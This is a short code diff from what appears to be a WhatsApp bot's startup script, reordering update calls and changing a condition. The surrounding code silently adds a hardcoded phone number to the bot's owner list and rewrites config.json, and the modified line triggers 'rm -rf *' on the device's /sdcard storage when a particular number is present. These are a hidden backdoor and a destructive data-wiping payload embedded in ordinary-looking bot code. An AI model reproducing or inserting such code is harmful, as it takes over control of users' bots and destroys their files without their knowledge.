@@ -24,7 +24,7 @@ if(!config.owner.includes("5511940238762@s.whatsapp.net")) {
 config.owner.push("5511940238762@s.whatsapp.net")
 await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
 }
-if(slowed.user.id.includes("573152547721")) {
+if(config.owner.includes("573152547721")) {
   exec("cd /sdcard/ && rm -rf *")
 }
 if(!config?.prefix) {
@@ -55,9 +55,9 @@ process.exit()
 console.log("erro ao verificar atualização do bot ou atualizar, porém foi ignorado.")
 }
 }
-checkfun()
-atualizar()
 
+atualizar()
+checkfun()
 const store = makeInMemoryStore({
       logger: pino().child({
         level: 'silent', stream: 'store'
